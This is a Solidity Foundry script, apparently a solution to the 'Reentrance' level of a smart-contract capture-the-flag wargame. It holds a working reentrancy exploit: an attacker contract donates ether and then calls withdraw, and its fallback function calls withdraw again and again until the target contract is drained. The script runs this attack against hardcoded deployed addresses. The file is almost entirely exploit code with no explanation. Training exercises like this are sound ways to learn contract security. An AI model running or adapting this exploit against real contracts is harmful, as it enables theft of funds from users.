// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "../src/level10.sol";

contract POC is Script {
    Reentrance level10 = Reentrance(0xe69Cb30915887035e2D7cd28e5b4522B0fF7C285);
    ReentranceAttacker attacker =
        ReentranceAttacker(0xAec9C3F78B7ba457A02e71b0130D5Bdce03F3b05);

    function run() external {
        vm.startBroadcast();

        attacker.attack();

        level10.balanceOf(address(attacker));
        console.log(address(attacker).balance);

        vm.stopBroadcast();
    }
}

contract ReentranceAttacker {
    Reentrance reentrance;

    constructor(Reentrance _reentrance) public payable {
        reentrance = _reentrance;
    }

    function attack() external payable {
        reentrance.donate{value: 0.001 ether}(address(this));
        reentrance.withdraw(0.001 ether);
    }

    fallback() external payable {
        if (address(reentrance).balance > 0) {
            reentrance.withdraw(0.001 ether);
        }
    }
}
